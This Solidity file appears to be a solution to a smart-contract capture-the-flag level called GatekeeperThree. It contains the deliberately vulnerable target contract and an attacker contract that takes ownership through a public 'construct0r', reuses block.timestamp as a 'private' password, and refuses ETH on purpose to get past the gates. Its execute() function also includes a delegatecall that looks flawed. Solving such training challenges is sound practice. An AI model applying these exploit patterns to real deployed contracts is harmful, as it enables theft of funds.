// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.1;

contract GateKeeper3Proxy {  
  address public owner = address(this);
  address public entrant = 0xD1729E3101b87B7032848C87390523d2FED18C46;
  bool public allowEntrance = true;

  constructor() payable {}
  
  function execute(address payable _gatekeeperAddress) public {
      GatekeeperThree(_gatekeeperAddress).construct0r();
      _gatekeeperAddress.transfer(0.001 ether);
      (bool success, bytes memory data) = _gatekeeperAddress.delegatecall(
            abi.encodeWithSignature("enter()")
        );
      require(success);
  }

  receive () external payable {
      revert();
  }


    function solve(address payable _gatekeeper) external {
        GatekeeperThree gatekeeper = GatekeeperThree(_gatekeeper);

        // Solve gateOne
        gatekeeper.construct0r(); // Sets owner to this contract

        // Solve gateTwo
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp); // Sets allow_enterance to true

        // Solve gateThree
        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
        (bool success, ) = payable(address(gatekeeper)).call{
            value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Completes the problem
        gatekeeper.enter();
    }
}

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}